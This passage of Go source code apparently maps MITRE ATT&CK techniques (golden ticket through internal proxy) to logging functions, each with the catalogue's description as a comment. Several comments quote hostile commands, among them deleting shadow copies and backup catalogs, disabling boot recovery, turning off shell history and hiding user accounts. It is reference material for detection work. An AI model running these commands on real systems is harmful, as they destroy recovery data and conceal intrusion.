*/
func (g *Session) ATTACKEntGoldenTicket(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1558.001").
        Msg("golden ticket")
}

/* ATTACKEntGraphicalUserInterface Phases: execution

This technique has been deprecated. Please use Remote Services where
appropriate. The Graphical User Interfaces (GUI) is a common way to interact
with an operating system. Adversaries may use a system's GUI during an
operation, commonly through a remote interactive session such as Remote Desktop
Protocol, instead of through a Command and Scripting Interpreter, to search for
information and execute files via mouse double-click events, the Windows Run
command (Citation: Wikipedia Run Command), or other potentially difficult to
monitor interactions.
*/
func (g *Session) ATTACKEntGraphicalUserInterface(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1061").
        Msg("graphical user interface")
}

/* ATTACKEntGroupPolicyModification Phases: defense-evasion privilege-escalation

Adversaries may modify Group Policy Objects (GPOs) to subvert the intended
discretionary access controls for a domain, usually with the intention of
escalating privileges on the domain. Group policy allows for centralized
management of user and computer settings in Active Directory (AD). GPOs are
containers for group policy settings made up of files stored within a predicable
network path \<DOMAIN>\SYSVOL\<DOMAIN>\Policies\.(Citation: TechNet Group Policy
Basics)(Citation: ADSecurity GPO Persistence 2016)  Like other objects in AD,
GPOs have access controls associated with them. By default all user accounts in
the domain have permission to read GPOs. It is possible to delegate GPO access
control permissions, e.g. write access, to specific users or groups in the
domain. Malicious GPO modifications can be used to implement many other
malicious behaviors such as Scheduled Task/Job, Disable or Modify Tools, Ingress
Tool Transfer, Create Account, Service Execution,  and more.(Citation:
ADSecurity GPO Persistence 2016)(Citation: Wald0 Guide to GPOs)(Citation:
Harmj0y Abusing GPO Permissions)(Citation: Mandiant M Trends 2016)(Citation:
Microsoft Hacking Team Breach) Since GPOs can control so many user and machine
settings in the AD environment, there are a great number of potential attacks
that can stem from this GPO abuse.(Citation: Wald0 Guide to GPOs) For example,
publicly available scripts such as New-GPOImmediateTask can be leveraged to
automate the creation of a malicious Scheduled Task/Job by modifying GPO
settings, in this case modifying
<GPO_PATH>\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml.(Citation:
Wald0 Guide to GPOs)(Citation: Harmj0y Abusing GPO Permissions) In some cases an
adversary might modify specific user rights like SeEnableDelegationPrivilege,
set in <GPO_PATH>\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf, to achieve a
subtle AD backdoor with complete control of the domain because the user account
under the adversary's control would then be able to modify GPOs.(Citation:
Harmj0y SeEnableDelegationPrivilege Right)
*/
func (g *Session) ATTACKEntGroupPolicyModification(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1484.001").
        Msg("group policy modification")
}

/* ATTACKEntGroupPolicyPreferences Phases: credential-access

Adversaries may attempt to find unsecured credentials in Group Policy
Preferences (GPP). GPP are tools that allow administrators to create domain
policies with embedded credentials. These policies allow administrators to set
local accounts.(Citation: Microsoft GPP 2016) These group policies are stored in
SYSVOL on a domain controller. This means that any domain user can view the
SYSVOL share and decrypt the password (using the AES key that has been made
public).(Citation: Microsoft GPP Key) The following tools and scripts can be
used to gather and decrypt the password file from Group Policy Preference XML
files:  Metasploit’s post exploitation module:
post/windows/gather/credentials/gpp Get-GPPPassword(Citation: Obscuresecurity
Get-GPPPassword) gpprefdecrypt.py  On the SYSVOL share, adversaries may use the
following command to enumerate potential GPP XML files: dir /s * .xml
*/
func (g *Session) ATTACKEntGroupPolicyPreferences(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1552.006").
        Msg("group policy preferences")
}

/* ATTACKEntHardware Phases: reconnaissance

Adversaries may gather information about the victim's host hardware that can be
used during targeting. Information about hardware infrastructure may include a
variety of details such as types and versions on specific hosts, as well as the
presence of additional components that might be indicative of added defensive
protections (ex: card/biometric readers, dedicated encryption hardware, etc.).
Adversaries may gather this information in various ways, such as direct
collection actions via Active Scanning (ex: hostnames, server banners, user
agent strings) or Phishing for Information. Adversaries may also compromise
sites then include malicious content designed to collect host information from
visitors.(Citation: ATT ScanBox) Information about the hardware infrastructure
may also be exposed to adversaries via online or other accessible data sets (ex:
job postings, network maps, assessment reports, resumes, or purchase invoices).
Gathering this information may reveal opportunities for other forms of
reconnaissance (ex: Search Open Websites/Domains or Search Open Technical
Databases), establishing operational resources (ex: Develop Capabilities or
Obtain Capabilities), and/or initial access (ex: Compromise Hardware Supply
Chain or Hardware Additions).
*/
func (g *Session) ATTACKEntHardware(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1592.001").
        Msg("hardware")
}

/* ATTACKEntHardwareAdditions Phases: initial-access

Adversaries may introduce computer accessories, computers, or networking
hardware into a system or network that can be used as a vector to gain access.
While public references of usage by APT groups are scarce, many penetration
testers leverage hardware additions for initial access. Commercial and open
source products are leveraged with capabilities such as passive network tapping
(Citation: Ossmann Star Feb 2011), man-in-the middle encryption breaking
(Citation: Aleks Weapons Nov 2015), keystroke injection (Citation: Hak5
RubberDuck Dec 2016), kernel memory reading via DMA (Citation: Frisk DMA August
2016), adding new wireless access to an existing network (Citation: McMillan Pwn
March 2012), and others.
*/
func (g *Session) ATTACKEntHardwareAdditions(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1200").
        Msg("hardware additions")
}

/* ATTACKEntHiddenFileSystem Phases: defense-evasion

Adversaries may use a hidden file system to conceal malicious activity from
users and security tools. File systems provide a structure to store and access
data from physical storage. Typically, a user engages with a file system through
applications that allow them to access files and directories, which are an
abstraction from their physical location (ex: disk sector). Standard file
systems include FAT, NTFS, ext4, and APFS. File systems can also contain other
structures, such as the Volume Boot Record (VBR) and Master File Table (MFT) in
NTFS.(Citation: MalwareTech VFS Nov 2014) Adversaries may use their own
abstracted file system, separate from the standard file system present on the
infected system. In doing so, adversaries can hide the presence of malicious
components and file input/output from security tools. Hidden file systems,
sometimes referred to as virtual file systems, can be implemented in numerous
ways. One implementation would be to store a file system in reserved disk space
unused by disk structures or standard file system partitions.(Citation:
MalwareTech VFS Nov 2014)(Citation: FireEye Bootkits) Another implementation
could be for an adversary to drop their own portable partition image as a file
on top of the standard file system.(Citation: ESET ComRAT May 2020) Adversaries
may also fragment files across the existing file system structure in non-
standard ways.(Citation: Kaspersky Equation QA)
*/
func (g *Session) ATTACKEntHiddenFileSystem(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1564.005").
        Msg("hidden file system")
}

/* ATTACKEntHiddenFilesandDirectories Phases: defense-evasion

Adversaries may set files and directories to be hidden to evade detection
mechanisms. To prevent normal users from accidentally changing special files on
a system, most operating systems have the concept of a ‘hidden’ file. These
files don’t show up when a user browses the file system with a GUI or when using
normal commands on the command line. Users must explicitly ask to show the
hidden files either via a series of Graphical User Interface (GUI) prompts or
with command line switches (dir /a for Windows and ls –a for Linux and macOS).
On Linux and Mac, users can mark specific files as hidden simply by putting a
“.” as the first character in the file or folder name  (Citation: Sofacy Komplex
Trojan) (Citation: Antiquated Mac Malware). Files and folders that start with a
period, ‘.’, are by default hidden from being viewed in the Finder application
and standard command-line utilities like “ls”. Users must specifically change
settings to have these files viewable. Files on macOS can also be marked with
the UF_HIDDEN flag which prevents them from being seen in Finder.app, but still
allows them to be seen in Terminal.app (Citation: WireLurker). On Windows, users
can mark specific files as hidden by using the attrib.exe binary. Many
applications create these hidden files and folders to store information so that
it doesn’t clutter up the user’s workspace. For example, SSH utilities create a
.ssh folder that’s hidden and contains the user’s known hosts and keys.
Adversaries can use this to their advantage to hide files and folders anywhere
on the system and evading a typical user or system analysis that does not
incorporate investigation of hidden files.
*/
func (g *Session) ATTACKEntHiddenFilesandDirectories(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1564.001").
        Msg("hidden files and directories")
}

/* ATTACKEntHiddenUsers Phases: defense-evasion

Adversaries may use hidden users to mask the presence of user accounts they
create. Every user account in macOS has a userID associated with it. When
creating a user, you can specify the userID for that account. There is a
property value in /Library/Preferences/com.apple.loginwindow called Hide500Users
that prevents users with userIDs 500 and lower from appearing at the login
screen. When using the Create Account technique with a userID under 500 (ex:
sudo dscl . -create /Users/username UniqueID 401) and enabling this property
(setting it to Yes), an adversary can conceal user accounts. (Citation:
Cybereason OSX Pirrit).
*/
func (g *Session) ATTACKEntHiddenUsers(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1564.002").
        Msg("hidden users")
}

/* ATTACKEntHiddenWindow Phases: defense-evasion

Adversaries may use hidden windows to conceal malicious activity from the plain
sight of users. In some cases, windows that would typically be displayed when an
application carries out an operation can be hidden. This may be utilized by
system administrators to avoid disrupting user work environments when carrying
out administrative tasks.  On Windows, there are a variety of features in
scripting languages in Windows, such as PowerShell, Jscript, and Visual Basic to
make windows hidden. One example of this is powershell.exe -WindowStyle Hidden.
(Citation: PowerShell About 2019) Similarly, on macOS the configurations for how
applications run are listed in property list (plist) files. One of the tags in
these files can be apple.awt.UIElement, which allows for Java applications to
prevent the application's icon from appearing in the Dock. A common use for this
is when applications run in the system tray, but don't also want to show up in
the Dock. Adversaries may abuse these functionalities to hide otherwise visible
windows from users so as not to alert the user to adversary activity on the
system.(Citation: Antiquated Mac Malware)
*/
func (g *Session) ATTACKEntHiddenWindow(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1564.003").
        Msg("hidden window")
}

/* ATTACKEntHideArtifacts Phases: defense-evasion

Adversaries may attempt to hide artifacts associated with their behaviors to
evade detection. Operating systems may have features to hide various artifacts,
such as important system files and administrative task execution, to avoid
disrupting user work environments and prevent users from changing files or
features on the system. Adversaries may abuse these features to hide artifacts
such as files, directories, user accounts, or other system activity to evade
detection.(Citation: Sofacy Komplex Trojan)(Citation: Cybereason OSX
Pirrit)(Citation: MalwareBytes ADS July 2015) Adversaries may also attempt to
hide artifacts associated with malicious behavior by creating computing regions
that are isolated from common security instrumentation, such as through the use
of virtualization technology.(Citation: Sophos Ragnar May 2020)
*/
func (g *Session) ATTACKEntHideArtifacts(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1564").
        Msg("hide artifacts")
}

/* ATTACKEntHijackExecutionFlow Phases: persistence privilege-escalation defense-evasion

Adversaries may execute their own malicious payloads by hijacking the way
operating systems run programs. Hijacking execution flow can be for the purposes
of persistence, since this hijacked execution may reoccur over time. Adversaries
may also use these mechanisms to elevate privileges or evade defenses, such as
application control or other restrictions on execution. There are many ways an
adversary may hijack the flow of execution, including by manipulating how the
operating system locates programs to be executed. How the operating system
locates libraries to be used by a program can also be intercepted. Locations
where the operating system looks for programs/resources, such as file
directories and in the case of Windows the Registry, could also be poisoned to
include malicious payloads.
*/
func (g *Session) ATTACKEntHijackExecutionFlow(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1574").
        Msg("hijack execution flow")
}

/* ATTACKEntHypervisor Phases: persistence

This technique has been deprecated and should no longer be used. A type-1
hypervisor is a software layer that sits between the guest operating systems and
system's hardware. (Citation: Wikipedia Hypervisor) It presents a virtual
running environment to an operating system. An example of a common hypervisor is
Xen. (Citation: Wikipedia Xen) A type-1 hypervisor operates at a level below the
operating system and could be designed with Rootkit functionality to hide its
existence from the guest operating system. (Citation: Myers 2007) A malicious
hypervisor of this nature could be used to persist on systems through
interruption.
*/
func (g *Session) ATTACKEntHypervisor(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1062").
        Msg("hypervisor")
}

/* ATTACKEntIPAddresses Phases: reconnaissance

Adversaries may gather the victim's IP addresses that can be used during
targeting. Public IP addresses may be allocated to organizations by block, or a
range of sequential addresses. Information about assigned IP addresses may
include a variety of details, such as which IP addresses are in use. IP
addresses may also enable an adversary to derive other details about a victim,
such as organizational size, physical location(s), Internet service provider,
and or where/how their publicly-facing infrastructure is hosted. Adversaries may
gather this information in various ways, such as direct collection actions via
Active Scanning or Phishing for Information. Information about assigned IP
addresses may also be exposed to adversaries via online or other accessible data
sets (ex: Search Open Technical Databases).(Citation: WHOIS)(Citation: DNS
Dumpster)(Citation: Circl Passive DNS) Gathering this information may reveal
opportunities for other forms of reconnaissance (ex: Active Scanning or Search
Open Websites/Domains), establishing operational resources (ex: Acquire
Infrastructure or Compromise Infrastructure), and/or initial access (ex:
External Remote Services).
*/
func (g *Session) ATTACKEntIPAddresses(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1590.005").
        Msg("ip addresses")
}

/* ATTACKEntIdentifyBusinessTempo Phases: reconnaissance

Adversaries may gather information about the victim's business tempo that can be
used during targeting. Information about an organization’s business tempo may
include a variety of details, including operational hours/days of the week. This
information may also reveal times/dates of purchases and shipments of the
victim’s hardware and software resources. Adversaries may gather this
information in various ways, such as direct elicitation via Phishing for
Information. Information about business tempo may also be exposed to adversaries
via online or other accessible data sets (ex: Social Media or Search Victim-
Owned Websites).(Citation: ThreatPost Broadvoice Leak) Gathering this
information may reveal opportunities for other forms of reconnaissance (ex:
Phishing for Information or Search Open Websites/Domains), establishing
operational resources (ex: Establish Accounts or Compromise Accounts), and/or
initial access (ex: Supply Chain Compromise or Trusted Relationship)
*/
func (g *Session) ATTACKEntIdentifyBusinessTempo(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1591.003").
        Msg("identify business tempo")
}

/* ATTACKEntIdentifyRoles Phases: reconnaissance

Adversaries may gather information about identities and roles within the victim
organization that can be used during targeting. Information about business roles
may reveal a variety of targetable details, including identifiable information
for key personnel as well as what data/resources they have access to.
Adversaries may gather this information in various ways, such as direct
elicitation via Phishing for Information. Information about business roles may
also be exposed to adversaries via online or other accessible data sets (ex:
Social Media or Search Victim-Owned Websites).(Citation: ThreatPost Broadvoice
Leak) Gathering this information may reveal opportunities for other forms of
reconnaissance (ex: Phishing for Information or Search Open Websites/Domains),
establishing operational resources (ex: Establish Accounts or Compromise
Accounts), and/or initial access (ex: Phishing).
*/
func (g *Session) ATTACKEntIdentifyRoles(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1591.004").
        Msg("identify roles")
}

/* ATTACKEntImageFileExecutionOptionsInjection Phases: privilege-escalation persistence

Adversaries may establish persistence and/or elevate privileges by executing
malicious content triggered by Image File Execution Options (IFEO) debuggers.
IFEOs enable a developer to attach a debugger to an application. When a process
is created, a debugger present in an application’s IFEO will be prepended to the
application’s name, effectively launching the new process under the debugger
(e.g., C:\dbg\ntsd.exe -g  notepad.exe). (Citation: Microsoft Dev Blog IFEO Mar
2010) IFEOs can be set directly via the Registry or in Global Flags via the
GFlags tool. (Citation: Microsoft GFlags Mar 2017) IFEOs are represented as
Debugger values in the Registry under
HKLM\SOFTWARE{\Wow6432Node}\Microsoft\Windows NT\CurrentVersion\Image File
Execution Options\ where <executable> is the binary on which the debugger is
attached. (Citation: Microsoft Dev Blog IFEO Mar 2010) IFEOs can also enable an
arbitrary monitor program to be launched when a specified program silently exits
(i.e. is prematurely terminated by itself or a second, non kernel-mode process).
(Citation: Microsoft Silent Process Exit NOV 2017) (Citation: Oddvar Moe IFEO
APR 2018) Similar to debuggers, silent exit monitoring can be enabled through
GFlags and/or by directly modifying IFEO and silent process exit Registry values
in HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows
NT\CurrentVersion\SilentProcessExit\. (Citation: Microsoft Silent Process Exit
NOV 2017) (Citation: Oddvar Moe IFEO APR 2018) Similar to Accessibility
Features, on Windows Vista and later as well as Windows Server 2008 and later, a
Registry key may be modified that configures "cmd.exe," or another program that
provides backdoor access, as a "debugger" for an accessibility program (ex:
utilman.exe). After the Registry is modified, pressing the appropriate key
combination at the login screen while at the keyboard or when connected with
Remote Desktop Protocol will cause the "debugger" program to be executed with
SYSTEM privileges. (Citation: Tilbury 2014) Similar to Process Injection, these
values may also be abused to obtain privilege escalation by causing a malicious
executable to be loaded and run in the context of separate processes on the
computer. (Citation: Elastic Process Injection July 2017) Installing IFEO
mechanisms may also provide Persistence via continuous triggered invocation.
Malware may also use IFEO to Impair Defenses by registering invalid debuggers
that redirect and effectively disable various system and security applications.
(Citation: FSecure Hupigon) (Citation: Symantec Ushedix June 2008)
*/
func (g *Session) ATTACKEntImageFileExecutionOptionsInjection(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1546.012").
        Msg("image file execution options injection")
}

/* ATTACKEntImpairCommandHistoryLogging Phases: defense-evasion

Adversaries may impair command history logging to hide commands they run on a
compromised system. Various command interpreters keep track of the commands
users type in their terminal so that users can retrace what they've done.  On
Linux and macOS, command history is tracked in a file pointed to by the
environment variable HISTFILE. When a user logs off a system, this information
is flushed to a file in the user's home directory called ~/.bash_history. The
HISTCONTROL environment variable keeps track of what should be saved by the
history command and eventually into the ~/.bash_history file when a user logs
out. HISTCONTROL does not exist by default on macOS, but can be set by the user
and will be respected. Adversaries may clear the history environment variable
(unset HISTFILE) or set the command history size to zero (export HISTFILESIZE=0)
to prevent logging of commands. Additionally, HISTCONTROL can be configured to
ignore commands that start with a space by simply setting it to "ignorespace".
HISTCONTROL can also be set to ignore duplicate commands by setting it to
"ignoredups". In some Linux systems, this is set by default to "ignoreboth"
which covers both of the previous examples. This means that “ ls” will not be
saved, but “ls” would be saved by history. Adversaries can abuse this to operate
without leaving traces by simply prepending a space to all of their terminal
commands. On Windows systems, the PSReadLine module tracks commands used in all
PowerShell sessions and writes them to a file
($env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt by
default). Adversaries may change where these logs are saved using Set-
PSReadLineOption -HistorySavePath {File Path}. This will cause
ConsoleHost_history.txt to stop receiving logs. Additionally, it is possible to
turn off logging to this file using the PowerShell command Set-PSReadlineOption
-HistorySaveStyle SaveNothing.(Citation: Microsoft PowerShell Command
History)(Citation: Sophos PowerShell command audit)(Citation: Sophos PowerShell
Command History Forensics)
*/
func (g *Session) ATTACKEntImpairCommandHistoryLogging(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1562.003").
        Msg("impair command history logging")
}

/* ATTACKEntImpairDefenses Phases: defense-evasion

Adversaries may maliciously modify components of a victim environment in order
to hinder or disable defensive mechanisms. This not only involves impairing
preventative defenses, such as firewalls and anti-virus, but also detection
capabilities that defenders can use to audit activity and identify malicious
behavior. This may also span both native defenses as well as supplemental
capabilities installed by users and administrators. Adversaries could also
target event aggregation and analysis mechanisms, or otherwise disrupt these
procedures by altering other system components.
*/
func (g *Session) ATTACKEntImpairDefenses(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1562").
        Msg("impair defenses")
}

/* ATTACKEntImplantInternalImage Phases: persistence

Adversaries may implant cloud or container images with malicious code to
establish persistence after gaining access to an environment. Amazon Web
Services (AWS) Amazon Machine Images (AMIs), Google Cloud Platform (GCP) Images,
and Azure Images as well as popular container runtimes such as Docker can be
implanted or backdoored. Unlike Upload Malware, this technique focuses on
adversaries implanting an image in a registry within a victim’s environment.
Depending on how the infrastructure is provisioned, this could provide
persistent access if the infrastructure provisioning tool is instructed to
always use the latest image.(Citation: Rhino Labs Cloud Image Backdoor Technique
Sept 2019) A tool has been developed to facilitate planting backdoors in cloud
container images.(Citation: Rhino Labs Cloud Backdoor September 2019) If an
attacker has access to a compromised AWS instance, and permissions to list the
available container images, they may implant a backdoor such as a Web
Shell.(Citation: Rhino Labs Cloud Image Backdoor Technique Sept 2019)
*/
func (g *Session) ATTACKEntImplantInternalImage(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1525").
        Msg("implant internal image")
}

/* ATTACKEntIndicatorBlocking Phases: defense-evasion

An adversary may attempt to block indicators or events typically captured by
sensors from being gathered and analyzed. This could include maliciously
redirecting (Citation: Microsoft Lamin Sept 2017) or even disabling host-based
sensors, such as Event Tracing for Windows (ETW),(Citation: Microsoft About
Event Tracing 2018) by tampering settings that control the collection and flow
of event telemetry. (Citation: Medium Event Tracing Tampering 2018) These
settings may be stored on the system in configuration files and/or in the
Registry as well as being accessible via administrative utilities such as
PowerShell or Windows Management Instrumentation. ETW interruption can be
achieved multiple ways, however most directly by defining conditions using the
PowerShell Set-EtwTraceProvider cmdlet or by interfacing directly with the
Registry to make alterations. In the case of network-based reporting of
indicators, an adversary may block traffic associated with reporting to prevent
central analysis. This may be accomplished by many means, such as stopping a
local process responsible for forwarding telemetry and/or creating a host-based
firewall rule to block traffic to specific hosts responsible for aggregating
events, such as security information and event management (SIEM) products.
*/
func (g *Session) ATTACKEntIndicatorBlocking(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1562.006").
        Msg("indicator blocking")
}

/* ATTACKEntIndicatorRemovalfromTools Phases: defense-evasion

Adversaries may remove indicators from tools if they believe their malicious
tool was detected, quarantined, or otherwise curtailed. They can modify the tool
by removing the indicator and using the updated version that is no longer
detected by the target's defensive systems or subsequent targets that may use
similar systems. A good example of this is when malware is detected with a file
signature and quarantined by anti-virus software. An adversary who can determine
that the malware was quarantined because of its file signature may modify the
file to explicitly avoid that signature, and then re-use the malware.
*/
func (g *Session) ATTACKEntIndicatorRemovalfromTools(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1027.005").
        Msg("indicator removal from tools")
}

/* ATTACKEntIndicatorRemovalonHost Phases: defense-evasion

Adversaries may delete or alter generated artifacts on a host system, including
logs or captured files such as quarantined malware. Locations and format of logs
are platform or product-specific, however standard operating system logs are
captured as Windows events or Linux/macOS files such as Bash History and
/var/log/*. These actions may interfere with event collection, reporting, or
other notifications used to detect intrusion activity. This that may compromise
the integrity of security solutions by causing notable events to go unreported.
This activity may also impede forensic analysis and incident response, due to
lack of sufficient data to determine what occurred.
*/
func (g *Session) ATTACKEntIndicatorRemovalonHost(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1070").
        Msg("indicator removal on host")
}

/* ATTACKEntIndirectCommandExecution Phases: defense-evasion

Adversaries may abuse utilities that allow for command execution to bypass
security restrictions that limit the use of command-line interpreters. Various
Windows utilities may be used to execute commands, possibly without invoking
cmd. For example, Forfiles, the Program Compatibility Assistant (pcalua.exe),
components of the Windows Subsystem for Linux (WSL), as well as other utilities
may invoke the execution of programs and commands from a Command and Scripting
Interpreter, Run window, or via scripts. (Citation: VectorSec ForFiles Aug 2017)
(Citation: Evi1cg Forfiles Nov 2017) Adversaries may abuse these features for
Defense Evasion, specifically to perform arbitrary execution while subverting
detections and/or mitigation controls (such as Group Policy) that limit/prevent
the usage of cmd or file extensions more commonly associated with malicious
payloads.
*/
func (g *Session) ATTACKEntIndirectCommandExecution(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1202").
        Msg("indirect command execution")
}

/* ATTACKEntIngressToolTransfer Phases: command-and-control

Adversaries may transfer tools or other files from an external system into a
compromised environment. Files may be copied from an external adversary
controlled system through the command and control channel to bring tools into
the victim network or through alternate protocols with another tool such as FTP.
Files can also be copied over on Mac and Linux with native tools like scp,
rsync, and sftp.
*/
func (g *Session) ATTACKEntIngressToolTransfer(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1105").
        Msg("ingress tool transfer")
}

/* ATTACKEntInhibitSystemRecovery Phases: impact

Adversaries may delete or remove built-in operating system data and turn off
services designed to aid in the recovery of a corrupted system to prevent
recovery.(Citation: Talos Olympic Destroyer 2018)(Citation: FireEye WannaCry
2017) Operating systems may contain features that can help fix corrupted
systems, such as a backup catalog, volume shadow copies, and automatic repair
features. Adversaries may disable or delete system recovery features to augment
the effects of Data Destruction and Data Encrypted for Impact.(Citation: Talos
Olympic Destroyer 2018)(Citation: FireEye WannaCry 2017) A number of native
Windows utilities have been used by adversaries to disable or delete system
recovery features:  vssadmin.exe can be used to delete all volume shadow copies
on a system - vssadmin.exe delete shadows /all /quiet Windows Management
Instrumentation can be used to delete volume shadow copies - wmic shadowcopy
delete wbadmin.exe can be used to delete the Windows Backup Catalog -
wbadmin.exe delete catalog -quiet bcdedit.exe can be used to disable automatic
Windows recovery features by modifying boot configuration data - bcdedit.exe
/set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default}
recoveryenabled no
*/
func (g *Session) ATTACKEntInhibitSystemRecovery(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1490").
        Msg("inhibit system recovery")
}

/* ATTACKEntInputCapture Phases: collection credential-access

Adversaries may use methods of capturing user input to obtain credentials or
collect information. During normal system usage, users often provide credentials
to various different locations, such as login pages/portals or system dialog
boxes. Input capture mechanisms may be transparent to the user (e.g. Credential
API Hooking) or rely on deceiving the user into providing input into what they
believe to be a genuine service (e.g. Web Portal Capture).
*/
func (g *Session) ATTACKEntInputCapture(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1056").
        Msg("input capture")
}

/* ATTACKEntInstallDigitalCertificate Phases: resource-development

Adversaries may install SSL/TLS certificates that can be used during targeting.
SSL/TLS certificates are files that can be installed on servers to enable secure
communications between systems. Digital certificates include information about
the key, information about its owner's identity, and the digital signature of an
entity that has verified the certificate's contents are correct. If the
signature is valid, and the person examining the certificate trusts the signer,
then they know they can use that key to communicate securely with its owner.
Certificates can be uploaded to a server, then the server can be configured to
use the certificate to enable encrypted communication with it.(Citation:
DigiCert Install SSL Cert) Adversaries may install SSL/TLS certificates that can
be used to further their operations, such as encrypting C2 traffic (ex:
Asymmetric Cryptography with Web Protocols) or lending credibility to a
credential harvesting site. Installation of digital certificates may take place
for a number of server types, including web servers and email servers.
Adversaries can obtain digital certificates (see Digital Certificates) or create
self-signed certificates (see Digital Certificates). Digital certificates can
then be installed on adversary controlled infrastructure that may have been
acquired (Acquire Infrastructure) or previously compromised (Compromise
Infrastructure).
*/
func (g *Session) ATTACKEntInstallDigitalCertificate(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1608.003").
        Msg("install digital certificate")
}

/* ATTACKEntInstallRootCertificate Phases: defense-evasion

Adversaries may install a root certificate on a compromised system to avoid
warnings when connecting to adversary controlled web servers. Root certificates
are used in public key cryptography to identify a root certificate authority
(CA). When a root certificate is installed, the system or application will trust
certificates in the root's chain of trust that have been signed by the root
certificate. (Citation: Wikipedia Root Certificate) Certificates are commonly
used for establishing secure TLS/SSL communications within a web browser. When a
user attempts to browse a website that presents a certificate that is not
trusted an error message will be displayed to warn the user of the security
risk. Depending on the security settings, the browser may not allow the user to
establish a connection to the website. Installation of a root certificate on a
compromised system would give an adversary a way to degrade the security of that
system. Adversaries have used this technique to avoid security warnings
prompting users when compromised systems connect over HTTPS to adversary
controlled web servers that spoof legitimate websites in order to collect login
credentials. (Citation: Operation Emmental) Atypical root certificates have also
been pre-installed on systems by the manufacturer or in the software supply
chain and were used in conjunction with malware/adware to provide a man-in-the-
middle capability for intercepting information transmitted over secure TLS/SSL
communications. (Citation: Kaspersky Superfish) Root certificates (and their
associated chains) can also be cloned and reinstalled. Cloned certificate chains
will carry many of the same metadata characteristics of the source and can be
used to sign malicious code that may then bypass signature validation tools (ex:
Sysinternals, antivirus, etc.) used to block execution and/or uncover artifacts
of Persistence. (Citation: SpectorOps Code Signing Dec 2017) In macOS, the Ay
MaMi malware uses /usr/bin/security add-trusted-cert -d -r trustRoot -k
/Library/Keychains/System.keychain /path/to/malicious/cert to install a
malicious certificate as a trusted root certificate into the system keychain.
(Citation: objective-see ay mami 2018)
*/
func (g *Session) ATTACKEntInstallRootCertificate(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1553.004").
        Msg("install root certificate")
}

/* ATTACKEntInstallUtil Phases: defense-evasion

Adversaries may use InstallUtil to proxy execution of code through a trusted
Windows utility. InstallUtil is a command-line utility that allows for
installation and uninstallation of resources by executing specific installer
components specified in .NET binaries. (Citation: MSDN InstallUtil) InstallUtil
is digitally signed by Microsoft and located in the .NET directories on a
Windows system: C:\Windows\Microsoft.NET\Framework\v\InstallUtil.exe and
C:\Windows\Microsoft.NET\Framework64\v\InstallUtil.exe. InstallUtil may also be
used to bypass application control through use of attributes within the binary
that execute the class decorated with the attribute
[System.ComponentModel.RunInstaller(true)]. (Citation: LOLBAS Installutil)
*/
func (g *Session) ATTACKEntInstallUtil(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1218.004").
        Msg("installutil")
}

/* ATTACKEntInterProcessCommunication Phases: execution

Adversaries may abuse inter-process communication (IPC) mechanisms for local
code or command execution. IPC is typically used by processes to share data,
communicate with each other, or synchronize execution. IPC is also commonly used
to avoid situations such as deadlocks, which occurs when processes are stuck in
a cyclic waiting pattern.  Adversaries may abuse IPC to execute arbitrary code
or commands. IPC mechanisms may differ depending on OS, but typically exists in
a form accessible through programming languages/libraries or native interfaces
such as Windows Dynamic Data Exchange or Component Object Model. Higher level
execution mediums, such as those of Command and Scripting Interpreters, may also
leverage underlying IPC mechanisms.
*/
func (g *Session) ATTACKEntInterProcessCommunication(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1559").
        Msg("inter-process communication")
}

/* ATTACKEntInternalDefacement Phases: impact

An adversary may deface systems internal to an organization in an attempt to
intimidate or mislead users. This may take the form of modifications to internal
websites, or directly to user systems with the replacement of the desktop
wallpaper.(Citation: Novetta Blockbuster) Disturbing or offensive images may be
used as a part of Internal Defacement in order to cause user discomfort, or to
pressure compliance with accompanying messages. Since internally defacing
systems exposes an adversary's presence, it often takes place after other
intrusion goals have been accomplished.(Citation: Novetta Blockbuster
Destructive Malware)
*/
func (g *Session) ATTACKEntInternalDefacement(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1491.001").
        Msg("internal defacement")
}

/* ATTACKEntInternalProxy Phases: command-and-control

Adversaries may use an internal proxy to direct command and control traffic
